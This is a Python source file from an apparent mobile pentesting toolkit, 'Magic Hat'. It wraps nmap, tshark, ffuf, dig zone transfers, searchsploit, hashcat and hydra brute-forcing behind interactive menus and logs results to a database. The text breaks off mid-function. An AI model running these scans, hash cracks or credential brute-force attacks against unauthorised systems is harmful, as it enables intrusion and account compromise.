"""Offensive security tool execution handlers and loggers for Magic Hat."""

import os
import shutil
import subprocess
import re
import base64
from magic_hat.database import log_scan, get_scan_logs, get_connection
from magic_hat.utils import BANNER_IMAGE, clear_screen, get_all_device_ips, print_tactical_header, get_subnet_range, send_notification, Colors, ACTIVE_SCOPE, WEBHOOK_CONFIG
from magic_hat.server import is_server_running, toggle_web_server, log_detail

import qrcode  # Requires: pip install qrcode
import socket



def display_offensive_suite():
    while True:
        clear_screen()
        print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
        print(f"{Colors.YELLOW}{Colors.HEADER}=== OFFENSIVE & TACTICAL DEPLOYMENT SUITE ==={Colors.ENDC}".center(60))
        print("=" * 60)
        print(f"{Colors.YELLOW}--- RECON & PROFILING ---{Colors.ENDC}".center(60, " "))
        print("-" * 60)
        print(f"{Colors.BOLD}1.{Colors.ENDC} Recon & Target Profiler")
        print(f"{Colors.BOLD}2.{Colors.ENDC} Net Shark Packet Capture (tshark)")
        print(f"{Colors.BOLD}3.{Colors.ENDC} Web Directory Fuzzer (ffuf)")
        print(f"{Colors.BOLD}4.{Colors.ENDC} DNS Footprinting (dig)")
        print(f"{Colors.BOLD}5.{Colors.ENDC} Web Tech Stack Fingerprinting (whatweb)")
        print(f"{Colors.BOLD}6.{Colors.ENDC} Wireless & RF Footprinting")
        print("-" * 60)
        print(f"{Colors.YELLOW}--- AUDITING & EXPLOITATION ---{Colors.ENDC}".center(60, " "))
        print("-" * 60)
        print(f"{Colors.BOLD}7.{Colors.ENDC} SSH & PowerShell Remote Auditors")
        print(f"{Colors.BOLD}8.{Colors.ENDC} Hash Identifier & Cracking Assistant")
        print(f"{Colors.BOLD}9.{Colors.ENDC} Exploit Database Search (searchsploit)")
        print(f"{Colors.BOLD}10.{Colors.ENDC} Credential Service Auditor (hydra)")
        print("-" * 60)
        print(f"{Colors.YELLOW}--- TACTICAL DEPLOYMENT & UTILS ---{Colors.ENDC}".center(60, " "))
        print("-" * 60)
        print(f"{Colors.BOLD}11.{Colors.ENDC} Cryptographic Engine (Base64/XOR)")
        print(f"{Colors.BOLD}12.{Colors.ENDC} Tactical Reverse Shell Generator")
        print(f"{Colors.BOLD}13.{Colors.ENDC} ASCII QR Code Payload Generator")
        print(f"{Colors.BOLD}14.{Colors.ENDC} Bluetooth Attack & SDP Suite")
        print(f"{Colors.BOLD}15.{Colors.ENDC} Wireless Monitor Mode Manager")
        print(f"{Colors.BOLD}16.{Colors.ENDC} Wordlist Manager")
        print("=" * 60)
        print(f"{Colors.RED}99. Back to Lifecycle Menu (b){Colors.ENDC}".center(60, " "))
        print("=" * 60)
        
        choice = input(f"{Colors.YELLOW}Select tactical module [1-16, or 99/b]: {Colors.ENDC}").strip().lower()
        if choice in ["99", "b", "back"]:
            break
        elif choice == "1":
            handle_nmap_menu()
        elif choice == "2":
            handle_net_shark()
        elif choice == "3":
            handle_web_fuzzer()
        elif choice == "4":
            handle_dns_recon()
        elif choice == "5":
            handle_tech_fingerprint()
        elif choice == "6":
            handle_wireless_recon()
        elif choice == "7":
            handle_ssh_audit()
        elif choice == "8":
            handle_hash_identifier()
        elif choice == "9":
            handle_exploit_search()
        elif choice == "10":
            handle_hydra_audit()
        elif choice == "11":
            handle_crypto_engine()
        elif choice == "12":
            handle_payload_generator()
        elif choice == "13":
            handle_qr_exploit()
        elif choice == "14":
            handle_bluetooth_attacks()
        elif choice == "15":
            handle_monitor_mode()
        elif choice == "16":
            handle_wordlist_manager()
        else:
            input(f"{Colors.RED}Invalid choice! Press Enter to try again...{Colors.ENDC}")

def parse_open_ports(nmap_output):
    """Extract open ports and services from Nmap stdout using regex."""
    open_ports = []
    pattern = re.compile(r"^(\d+/(?:tcp|udp))\s+open\s+([^\s]+)\s*(.*)$", re.MULTILINE)
    matches = pattern.findall(nmap_output)
    for port_proto, service, desc in matches:
        open_ports.append({"port": port_proto, "service": service.strip()})
    return open_ports

def parse_nmap_deep_telemetry(nmap_output):
    """Extract open ports, services, OS hints, and MAC addresses from Nmap stdout."""
    telemetry = {
        "open_ports": [],
        "os_guess": "Unknown / Not Detected",
        "mac_address": "Unknown",
        "device_type": "Unknown"
    }
    
    port_pattern = re.compile(r"^(\d+/(?:tcp|udp))\s+open\s+([^\s]+)\s*(.*)$", re.MULTILINE)
    for port_proto, service, desc in port_pattern.findall(nmap_output):
        telemetry["open_ports"].append({"port": port_proto, "service": service.strip(), "details": desc.strip()})
        
    os_pattern = re.compile(r"OS details:\s+(.*)$", re.MULTILINE)
    os_match = os_pattern.search(nmap_output)
    if os_match:
        telemetry["os_guess"] = os_match.group(1).strip()
    else:
        running_pattern = re.compile(r"Running:\s+(.*)$", re.MULTILINE)
        running_match = running_pattern.search(nmap_output)
        if running_match:
            telemetry["os_guess"] = running_match.group(1).strip()

    mac_pattern = re.compile(r"MAC Address:\s+([0-9A-Fa-f:]+\s+\([^)]+\))", re.MULTILINE)
    mac_match = mac_pattern.search(nmap_output)
    if mac_match:
        telemetry["mac_address"] = mac_match.group(1).strip()
        
    return telemetry

def print_target_context(tool_title):
    """Print tactical header, active network interfaces/subnets, and page title."""
    clear_screen()
    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
    print_tactical_header()
    
    ips = get_all_device_ips()
    print(f"{Colors.YELLOW}[*] Active Interfaces & Host Spaces:{Colors.ENDC}")
    if ips:
        for iface, ip_cidr in ips:
            subnet = get_subnet_range(ip_cidr)
            print(f"    - [{iface}] IP: {ip_cidr} | Subnet: {subnet}")
    else:
        print(f"    {Colors.RED}[!] No active network interfaces detected (Check Wi-Fi / Hotspot){Colors.ENDC}")
        
    print("-" * 60)
    print(tool_title.center(60))
    print("-" * 60)

def select_target_interactive():
    """Display recent discovered targets from the database and let the user pick one."""
    logs = get_scan_logs()
    if not logs:
        print(f"{Colors.YELLOW}[!] No scan logs or targets found in database.{Colors.ENDC}")
        return None
        
    discovered_hosts = set()
    for log_entry in logs:
        # Handles both dictionary and SQLite Row tuple formats safely
        if isinstance(log_entry, dict):
            target_val = log_entry.get('target')
            tool_name = log_entry.get('tool_name', '')
            output_text = log_entry.get('output', '')
        else:
            # Fallback for tuple/row formats: (id, timestamp, scan_type, target, output)
            target_val = log_entry[3] if len(log_entry) > 3 else None
            tool_name = log_entry[2] if len(log_entry) > 2 else ''
            output_text = log_entry[4] if len(log_entry) > 4 else ''

        if target_val and target_val not in ["Local Airspace", "Airspace", "Local Host"]:
            discovered_hosts.add(target_val)
            
        if any(keyword in tool_name for keyword in ["Nmap", "Sweep", "Pipeline"]):
            ips = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b", output_text)
            for ip in ips:
                if not ip.startswith("8.8.") and ip != "255.255.255.255":
                    discovered_hosts.add(ip)

    hosts_list = sorted(list(discovered_hosts))
    if not hosts_list:
        print(f"{Colors.YELLOW}[!] No distinct host targets parsed from recent logs.{Colors.ENDC}")
        return None

    clear_screen()
    print_tactical_header()
    print("=== INTELLIGENCE TARGET SELECTOR ===".center(60))
    print("-" * 60)
    print("Discovered targets from database logs:")
    for idx, host in enumerate(hosts_list, 1):
        print(f"  {Colors.BOLD}{idx}.{Colors.ENDC} {host}")
    print(f"  {Colors.RED}0.{Colors.ENDC} Enter manually")
    print("-" * 60)
    
    choice = input(f"{Colors.YELLOW}Select target index [1-{len(hosts_list)}] or 0 for manual: {Colors.ENDC}").strip()
    if choice.isdigit():
        c_idx = int(choice)
        if 1 <= c_idx <= len(hosts_list):
            selected = hosts_list[c_idx - 1]
            print(f"{Colors.GREEN}[*] Auto-selected Target from Database: {selected}{Colors.ENDC}")
            return selected
            
    return None

def handle_nmap_menu():
    """Interactive Nmap scan selection and execution menu with deep target profiling."""
    while True:
        print_target_context("=== PAGE: NMAP DEEP RECON & TARGET PROFILER ===")
        print(f"{Colors.BOLD}1.{Colors.ENDC} Quick Port Scan (-T4)")
        print(f"{Colors.BOLD}2.{Colors.ENDC} Service & Version Detection (-sV -T4)")
        print(f"{Colors.BOLD}3.{Colors.ENDC} Comprehensive Target Profile (OS, Scripts, Versions: -A -sC -T4)")
        print(f"{Colors.BOLD}4.{Colors.ENDC} Full Port Sweep (-p- -T4)")
        print(f"{Colors.BOLD}5.{Colors.ENDC} Custom Flags")
        print(f"{Colors.RED}99. Back to Suite Menu (b){Colors.ENDC}")
        print("-" * 60)
        
        choice = input(f"{Colors.YELLOW}Select profile [1-5, or 99/b]: {Colors.ENDC}").strip().lower()
        if choice in ["99", "b", "back"]:
            break
            
        use_intel = input(f"{Colors.YELLOW}Select target from intelligence database? [Y/N]: {Colors.ENDC}").strip().lower()
        target = None
        if use_intel in ['y', 'yes']:
            target = select_target_interactive()
            
        if not target:
            target = input(f"{Colors.YELLOW}Enter target IP, hostname, or CIDR (or 'b' to back): {Colors.ENDC}").strip()
            if target.lower() in ["b", "99", "back", ""]:
                continue
            
        print(f"{Colors.GREEN}[*] Target Locked: {target}{Colors.ENDC}")
            
        flags = ["-T4"]
        if choice == "1":
            flags = ["-T4"]
        elif choice == "2":
            flags = ["-sV", "-T4"]
        elif choice == "3":
            flags = ["-A", "-sC", "-T4"]
        elif choice == "4":
            flags = ["-p-", "-T4"]
        elif choice == "5":
            custom = input(f"{Colors.YELLOW}Enter custom nmap arguments (e.g., -p 1-1000 -O): {Colors.ENDC}").strip()
            if custom.lower() in ["b", "99", "back"]:
                continue
            flags = custom.split()
        else:
            input(f"{Colors.RED}Invalid selection! Press Enter to continue...{Colors.ENDC}")
            continue
            
        print(f"{Colors.GREEN}\n[+] Launching Nmap target profiler on {target} with flags: {' '.join(flags)}{Colors.ENDC}")
        print(f"{Colors.YELLOW}[*] Performing deep enumeration (this may take a moment)...{Colors.ENDC}")
        try:
            cmd = ["nmap"] + flags + [target]
            result = subprocess.run(cmd, capture_output=True, text=True, check=True)
            output = result.stdout
            
            telemetry = parse_nmap_deep_telemetry(output)
            
            clear_screen()
            print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
            print_tactical_header()
            print(f"=== DEEP RECON REPORT: {target} ===".center(60))
            print("-" * 60)
            print(f"[*] Target OS Guess : {telemetry['os_guess']}")
            print(f"[*] MAC / Hardware  : {telemetry['mac_address']}")
            print("-" * 60)
            
            if telemetry["open_ports"]:
                print(f"{'PORT/PROTO':<12} | {'SERVICE':<15} | {'VERSION / DETAILS'}")
                print("-" * 60)
                for p in telemetry["open_ports"]:
                    print(f"{p['port']:<12} | {p['service']:<15} | {p['details']}")
            else:
                print("[*] Raw scan output (no standard ports parsed):")
                print(output[:1500])
            print("-" * 60)
            
            log_scan("Nmap Deep Recon", target, output, metadata=telemetry)
            print(f"{Colors.GREEN}[✔] Rich target profile logged successfully to database.{Colors.ENDC}")
        except subprocess.CalledProcessError as e:
            print(f"{Colors.RED}\n[-] Nmap failed: {e.stderr or str(e)}{Colors.ENDC}")
        except FileNotFoundError:
            print(f"{Colors.RED}\n[-] Error: 'nmap' binary not found. Run 'pkg install nmap'.{Colors.ENDC}")
            
        input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")

def handle_net_shark():
    """Tool 2: Net Shark (Packet Capture / tshark)."""
    print_target_context("=== PAGE: NET SHARK (PACKET CAPTURE) ===")
    
    ips = get_all_device_ips()
    print(f"{Colors.YELLOW}[*] Available Interfaces:{Colors.ENDC}")
    for iface, ip in ips:
        print(f"    - {iface} ({ip})")
    print("-" * 60)
    
    iface = input(f"{Colors.YELLOW}Enter interface to sniff (e.g., wlan0, rmnet0) or 'b' to back: {Colors.ENDC}").strip()
    if iface.lower() in ["b", "99", "back", ""]:
        return
        
    print(f"{Colors.GREEN}[*] Interface Locked: {iface}{Colors.ENDC}")
    count = input(f"{Colors.YELLOW}Enter packet count limit (default 20): {Colors.ENDC}").strip() or "20"
    
    print(f"{Colors.GREEN}\n[+] Initializing Net Shark on {iface} (capturing {count} packets)...{Colors.ENDC}")
    print(f"{Colors.YELLOW}[*] Press Ctrl+C if you need to abort early.\n{Colors.ENDC}")
    try:
        cmd = ["tshark", "-i", iface, "-c", str(count)]
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        output = result.stdout
        
        clear_screen()
        print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
        print_tactical_header()
        print(f"=== PACKET CAPTURE RESULTS: {iface} ===".center(60))
        print(output)
        
        log_scan("Net Shark", iface, output)
        print(f"{Colors.GREEN}\n[✔] Packet capture logged to database.{Colors.ENDC}")
    except subprocess.CalledProcessError as e:
        print(f"{Colors.RED}\n[-] Tshark failed: {e.stderr or str(e)}{Colors.ENDC}")
        print(f"{Colors.YELLOW}[-] Note: Sniffing cellular interfaces (like rmnet0) requires root privileges.{Colors.ENDC}")
    except FileNotFoundError:
        print(f"{Colors.RED}\n[-] Error: 'tshark' not found in path. Run 'pkg install tshark'.{Colors.ENDC}")
        
    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")

def handle_web_fuzzer():
    """Tool 3: Web Directory Fuzzer (ffuf wrapper)."""
    print_target_context("=== PAGE: WEB DIR FUZZER (FFUF) ===")
    
    use_intel = input(f"{Colors.YELLOW}Select target from intelligence database? [Y/N]: {Colors.ENDC}").strip().lower()
    url = None
    if use_intel in ['y', 'yes']:
        url = select_target_interactive()
        
    if not url:
        url = input(f"{Colors.YELLOW}Enter target URL or IP (e.g., http://192.168.8.1/FUZZ) or 'b' to back: {Colors.ENDC}").strip()
        if url.lower() in ["b", "99", "back", ""]:
            return
        
    if not url.startswith("http://") and not url.startswith("https://"):
        url = f"http://{url}/FUZZ"
    elif "FUZZ" not in url:
        url = url.rstrip("/") + "/FUZZ"
        
    if "FUZZ" not in url:
        url = url + "/FUZZ"
        
    print(f"{Colors.GREEN}[*] Target URL Locked: {url}{Colors.ENDC}")
    wordlist = input(f"{Colors.YELLOW}Enter wordlist path: {Colors.ENDC}").strip()
    if not wordlist:
        wordlist = "/data/data/com.termux/files/usr/share/wordlists/dirb/common.txt"
        
    print(f"{Colors.GREEN}\n[+] Launching FFUF fuzzer against {url}...{Colors.ENDC}")
    try:
        cmd = ["ffuf", "-u", url, "-w", wordlist, "-s"]
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        output = result.stdout
        
        clear_screen()
        print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
        print(f"=== FFUF DISCOVERY RESULTS ===".center(60))
        print(output if output else f"{Colors.YELLOW}[*] Scan completed, but no standard output captured.{Colors.ENDC}")
        
        log_scan("Web Fuzzer", url, output)
        print(f"{Colors.GREEN}\n[✔] Web fuzzing results successfully logged to database.{Colors.ENDC}")
    except subprocess.CalledProcessError as e:
        print(f"{Colors.RED}\n[-] FFUF failed: {e.stderr or str(e)}{Colors.ENDC}")
    except FileNotFoundError:
        print(f"{Colors.RED}\n[-] Error: 'ffuf' binary not found. Run 'pkg install ffuf'.{Colors.ENDC}")
        
    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")

def handle_dns_recon():
    """Tool 4: DNS Recon (dig wrapper)."""
    print_target_context("=== PAGE: DNS FOOTPRINTING (DIG) ===")
    
    domain = input(f"{Colors.YELLOW}Enter target domain or hostname (or 'b' to back): {Colors.ENDC}").strip()
    if domain.lower() in ["b", "99", "back", ""]:
        return
        
    print(f"{Colors.GREEN}[*] Domain Locked: {domain}{Colors.ENDC}")
    print("Select Record Query Type:")
    print(f"{Colors.BOLD}1.{Colors.ENDC} Standard Query (A, MX, NS)")
    print(f"{Colors.BOLD}2.{Colors.ENDC} All Records (ANY)")
    print(f"{Colors.BOLD}3.{Colors.ENDC} Zone Transfer Attempt (AXFR)")
    
    choice = input(f"{Colors.YELLOW}Select query type [1-3]: {Colors.ENDC}").strip()
    qtype = ""
    if choice == "2":
        qtype = "ANY"
    elif choice == "3":
        qtype = "AXFR"
        
    print(f"{Colors.GREEN}\n[+] Querying DNS records for {domain}...{Colors.ENDC}")
    try:
        cmd = ["dig", domain]
        if qtype:
            cmd.append(qtype)
            
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        output = result.stdout
        
        clear_screen()
        print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
        print(f"=== DNS RESULTS ({domain}) ===".center(60))
        print(output)
        
        log_scan("DNS Recon", domain, output)
        print(f"{Colors.GREEN}\n[✔] DNS footprint logged to database.{Colors.ENDC}")
    except subprocess.CalledProcessError as e:
        print(f"{Colors.RED}\n[-] Dig failed: {e.stderr or str(e)}{Colors.ENDC}")
    except FileNotFoundError:
        print(f"{Colors.RED}\n[-] Error: 'dig' binary not found. Run 'pkg install dnsutils'.{Colors.ENDC}")
        
    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")

def handle_tech_fingerprint():
    """Tool 5: Web Tech Fingerprinting (whatweb wrapper)."""
    print_target_context("=== PAGE: WEB TECH FINGERPRINT (WHATWEB) ===")
    
    use_intel = input(f"{Colors.YELLOW}Select target from intelligence database? [Y/N]: {Colors.ENDC}").strip().lower()
    target = None
    if use_intel in ['y', 'yes']:
        target = select_target_interactive()
        
    if not target:
        target = input(f"{Colors.YELLOW}Enter target URL or IP (or 'b' to back): {Colors.ENDC}").strip()
        if target.lower() in ["b", "99", "back", ""]:
            return
            
    print(f"{Colors.GREEN}[*] Target Locked: {target}{Colors.ENDC}")
    print(f"{Colors.GREEN}\n[+] Fingerprinting technology stack for {target}...{Colors.ENDC}")
    try:
        cmd = ["whatweb", target]
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        output = result.stdout
        
        clear_screen()
        print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
        print(f"=== TECH STACK REPORT: {target} ===".center(60))
        print(output)
        
        log_scan("Tech Fingerprint", target, output)
        print(f"{Colors.GREEN}\n[✔] Fingerprint results logged to database.{Colors.ENDC}")
    except subprocess.CalledProcessError as e:
        print(f"{Colors.RED}\n[-] WhatWeb failed: {e.stderr or str(e)}{Colors.ENDC}")
    except FileNotFoundError:
        print(f"{Colors.RED}\n[-] Error: 'whatweb' binary not found. Ensure it is installed in Termux.{Colors.ENDC}")
        
    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")

def handle_subnet_sweep():
    """Tool 6: Local Subnet Discovery & ARP Sweeping."""
    print_target_context("=== PAGE: SUBNET & ARP DISCOVERY ===")
    
    ips = get_all_device_ips()
    default_sub = "192.168.1.0/24"
    if ips:
        _, ip_c = ips[0]
        default_sub = get_subnet_range(ip_c)
        
    subnet = input(f"{Colors.YELLOW}Enter target CIDR [default {default_sub}] or 'b' to back: {Colors.ENDC}").strip()
    if subnet.lower() in ["b", "99", "back"]:
        return
    target_sub = subnet if subnet else default_sub
    
    print(f"{Colors.GREEN}[*] Subnet Locked: {target_sub}{Colors.ENDC}")
    print(f"{Colors.GREEN}\n[+] Sweeping subnet {target_sub} for live hosts...{Colors.ENDC}")
    try:
        cmd = ["nmap", "-sn", target_sub]
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        output = result.stdout
        
        clear_screen()
        print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
        print_tactical_header()
        print(f"=== LIVE HOST DISCOVERY: {target_sub} ===".center(60))
        print(output)
        
        log_scan("Subnet Sweep", target_sub, output)
        send_notification(f"Subnet Sweep Complete: Discovered live hosts on {target_sub}")
        print(f"{Colors.GREEN}\n[✔] Sweep results logged and notification triggered.{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.RED}\n[-] Sweep failed: {e}{Colors.ENDC}")
        
    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")

def handle_wireless_recon():
    """Tool 7: Wireless & RF Footprinting Wrapper."""
    clear_screen()
    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
    print_tactical_header()
    print("=== PAGE: WIRELESS & RF FOOTPRINTING ===".center(60))
    print("-" * 60)
    print(f"{Colors.BOLD}1.{Colors.ENDC} List Wireless Interfaces & Status (iw / nmcli)")
    print(f"{Colors.BOLD}2.{Colors.ENDC} Scan Nearby Wi-Fi Networks")
    print(f"{Colors.RED}99. Back to Suite Menu (b){Colors.ENDC}")
    print("-" * 60)
    
    choice = input(f"{Colors.YELLOW}Select option [1-2, or 99/b]: {Colors.ENDC}").strip().lower()
    if choice in ["99", "b", "back"]:
        return
    elif choice == "1":
        cmd = ["iw", "dev"]
    elif choice == "2":
        cmd = ["nmcli", "dev", "wifi"]
    else:
        return
        
    print(f"{Colors.GREEN}\n[+] Querying wireless subsystem...{Colors.ENDC}")
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        output = result.stdout
        
        clear_screen()
        print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
        print_tactical_header()
        print("=== WIRELESS RECON REPORT ===".center(60))
        print(output if output else f"{Colors.YELLOW}[*] Command executed but returned no output.{Colors.ENDC}")
        
        log_scan("Wireless Recon", "Local RF", output)
        print(f"{Colors.GREEN}\n[✔] Wireless telemetry logged to database.{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.RED}\n[-] Wireless command failed: {e}{Colors.ENDC}")
        
    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")

def handle_hash_identifier():
    """Tool 8: Hash Identification & Cracking Assistant."""
    clear_screen()
    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
    print_tactical_header()
    print("=== PAGE: HASH IDENTIFIER & AUDIT ===".center(60))
    print("-" * 60)
    
    hash_str = input(f"{Colors.YELLOW}Enter hash string to analyze (or 'b' to back): {Colors.ENDC}").strip()
    if hash_str.lower() in ["b", "99", "back", ""]:
        return
        
    print(f"{Colors.GREEN}[*] Target Hash Locked: {hash_str}{Colors.ENDC}")
    length = len(hash_str)
    identified = []
    
    if length == 32 and re.match(r"^[a-fA-F0-9]{32}$", hash_str):
        identified.append("MD5 / NTLM / MD4")
    elif length == 40 and re.match(r"^[a-fA-F0-9]{40}$", hash_str):
        identified.append("SHA-1 / MySQL")
    elif length == 64 and re.match(r"^[a-fA-F0-9]{64}$", hash_str):
        identified.append("SHA-256 / WPA-PSK TKIP")
    elif hash_str.startswith("$2a$") or hash_str.startswith("$2b$") or hash_str.startswith("$2y$"):
        identified.append("Bcrypt (Blowfish)")
    elif hash_str.startswith("$6$"):
        identified.append("SHA-512 Crypt (Linux)")
    else:
        identified.append("Unknown or complex hash format")
        
    clear_screen()
    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
    print_tactical_header()
    print("=== HASH ANALYSIS RESULTS ===".center(60))
    print(f"[*] Input Hash: {hash_str}")
    print(f"[*] Length: {length} characters")
    print("[*] Potential Formats:")
    for fmt in identified:
        print(f"    - {fmt}")
    print("-" * 60)
    
    run_crack = input(f"{Colors.YELLOW}Would you like to invoke hashcat against this hash? (Y/N): {Colors.ENDC}").strip().lower()
    if run_crack == 'y':
        mode = input(f"{Colors.YELLOW}Enter hashcat mode number (e.g., 0 for MD5, 1000 for NTLM): {Colors.ENDC}").strip()
        wordlist = input(f"{Colors.YELLOW}Enter wordlist path: {Colors.ENDC}").strip()
        if mode and wordlist:
            print(f"{Colors.GREEN}\n[+] Launching hashcat audit...{Colors.ENDC}")
            try:
                cmd = ["hashcat", "-a", "0", "-m", mode, hash_str, wordlist]
                res = subprocess.run(cmd, capture_output=True, text=True, check=True)
                print(res.stdout)
                log_scan("Hash Audit", hash_str, res.stdout)
            except Exception as e:
                print(f"{Colors.RED}\n[-] Hashcat execution failed: {e}{Colors.ENDC}")
                
    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")

def handle_exploit_search():
    """Tool 9: Exploit Search Engine (searchsploit wrapper)."""
    print_target_context("=== PAGE: EXPLOIT SEARCH ENGINE ===")
    
    query = input(f"{Colors.YELLOW}Enter service or software version (e.g., 'apache 2.4') or 'b' to back: {Colors.ENDC}").strip()
    if query.lower() in ["b", "99", "back", ""]:
        return
        
    print(f"{Colors.GREEN}[*] Query Locked: {query}{Colors.ENDC}")
    print(f"{Colors.GREEN}\n[+] Querying local exploit database for '{query}'...{Colors.ENDC}")
    try:
        cmd = ["searchsploit", query]
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        output = result.stdout
        
        clear_screen()
        print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
        print(f"=== EXPLOIT RESULTS: {query} ===".center(60))
        print(output)
        
        log_scan("Exploit Search", query, output)
        print(f"{Colors.GREEN}\n[✔] Exploit search results logged to database.{Colors.ENDC}")
    except FileNotFoundError:
        print(f"{Colors.RED}\n[-] Error: 'searchsploit' binary not found. Install exploitdb.{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.RED}\n[-] Searchsploit failed: {e}{Colors.ENDC}")
        
    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")

def handle_hydra_audit():
    """Tool 10: Credential & Service Auditor (hydra wrapper)."""
    print_target_context("=== PAGE: CREDENTIAL AUDITOR (HYDRA) ===")
    
    use_intel = input(f"{Colors.YELLOW}Select target from intelligence database? [Y/N]: {Colors.ENDC}").strip().lower()
    target = None
    if use_intel in ['y', 'yes']:
        target = select_target_interactive()
        
    if not target:
        target = input(f"{Colors.YELLOW}Enter target IP/hostname (or 'b' to back): {Colors.ENDC}").strip()
        if target.lower() in ["b", "99", "back", ""]:
            return
            
    print(f"{Colors.GREEN}[*] Target Locked: {target}{Colors.ENDC}")
    service = input(f"{Colors.YELLOW}Enter service protocol (ssh, ftp, http-post-form): {Colors.ENDC}").strip()
    user = input(f"{Colors.YELLOW}Enter username or user file path: {Colors.ENDC}").strip()
    wordlist = input(f"{Colors.YELLOW}Enter password wordlist path: {Colors.ENDC}").strip()
    
    if not all([target, service, user, wordlist]):
        input(f"{Colors.RED}\n[-] All fields are required. Press Enter to return...{Colors.ENDC}")
        return
        
    print(f"{Colors.GREEN}\n[+] Launching Hydra brute-force audit against {target} ({service})...{Colors.ENDC}")
    try:
        cmd = ["hydra", "-l", user, "-P", wordlist, target, service]
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        output = result.stdout
        
        clear_screen()
        print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
        print(f"=== HYDRA AUDIT RESULTS ===".center(60))
        print(output)
        
        log_scan("Hydra Audit", f"{service}://{target}", output)
        print(f"{Colors.GREEN}\n[✔] Credential audit logged to database.{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.RED}\n[-] Hydra execution failed: {e}{Colors.ENDC}")
        
    input(f"{Colors.YELLOW}\nPress Enter to return...{Colors.ENDC}")

def handle_wireless_bt_scanner():
    """Option 1: Scan nearby Wi-Fi networks and Bluetooth devices using Termux API or binaries."""
    clear_screen()
    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
    print_tactical_header()
    print("=== OPTION 1: WIRELESS & BLUETOOTH SCAN ===".center(60))
    print("-" * 60)
    
    print(f"{Colors.GREEN}[*] Scanning nearby Wi-Fi access points...{Colors.ENDC}")
    wifi_output = ""
    try:
        res = subprocess.run(["termux-wifi-scaninfo"], capture_output=True, text=True, timeout=5)
        if res.returncode == 0 and res.stdout.strip() and "[]" not in res.stdout:
            wifi_output = res.stdout
    except Exception:
        pass
        
    if not wifi_output:
        try:
            res = subprocess.run(["nmcli", "dev", "wifi"], capture_output=True, text=True, timeout=5)
            wifi_output = res.stdout
        except Exception:
            try:
                res = subprocess.run(["iw", "dev"], capture_output=True, text=True, timeout=5)
                wifi_output = res.stdout
            except Exception:
                pass
                
    if wifi_output.strip():
        print(wifi_output)
    else:
        print(f"{Colors.YELLOW}[-] Wi-Fi scan returned no data. (Tip: Install 'termux-api' package & app).{Colors.ENDC}")

    print("\n" + "=" * 60)
    print(f"{Colors.GREEN}[*] Scanning nearby Bluetooth devices...{Colors.ENDC}")
    bt_output = ""
    try:
        res = subprocess.run(["termux-bluetooth-devices"], capture_output=True, text=True, timeout=5)
        if res.returncode == 0 and res.stdout.strip() and "[]" not in res.stdout:
            bt_output = res.stdout
    except Exception:
        pass
        
    if not bt_output:
        try:
            res = subprocess.run(["hcitool", "scan"], capture_output=True, text=True, timeout=6)
            bt_output = res.stdout
        except Exception:
            pass
            
    if bt_output.strip():
        print(bt_output)
    else:
        print(f"{Colors.RED}[-] Bluetooth scan returned no data. Ensure Bluetooth is enabled.{Colors.ENDC}")
        
    log_scan("Wireless & BT Scanner", "Local Airspace", "Executed airspace scan via Termux API/binaries")
    input(f"{Colors.YELLOW}\nPress Enter to return to main menu...{Colors.ENDC}")

def handle_subnet_sweep_tool():
    """Option 2: Whole Subnet Host Sweep (Active Discovery)."""
    clear_screen()
    print(f"{Colors.YELLOW}{BANNER_IMAGE}{Colors.ENDC}")
    print_tactical_header()
    print("=== OPTION 2: WHOLE SUBNET HOST SWEEP ===".center(60))
    print("-" * 60)
    
    ips = get_all_device_ips()
    default_subnet = "192.168.1.0/24"
    if ips:
        _, ip_cidr = ips[0]
        default_subnet = get_subnet_range(ip_cidr)
        
    subnet = input(f"{Colors.YELLOW}Enter subnet/CIDR [default {default_subnet}] (or 'b' to back): {Colors.ENDC}").strip()
    if subnet.lower() in ["b", "99", "back"]:
        return
    target_subnet = subnet if subnet else default_subnet
    
    print(f"{Colors.GREEN}\n[+] Executing active ping/ARP sweep on host space: {target_subnet}...{Colors.ENDC}")
    try:
        cmd = ["nmap", "-sn", target_subnet]
        res = subprocess.run(cmd, capture_output=True, text=True, check=True)
        print(res.stdout)
        log_scan("Subnet Sweep", target_subnet, res.stdout)
    except Exception as e:
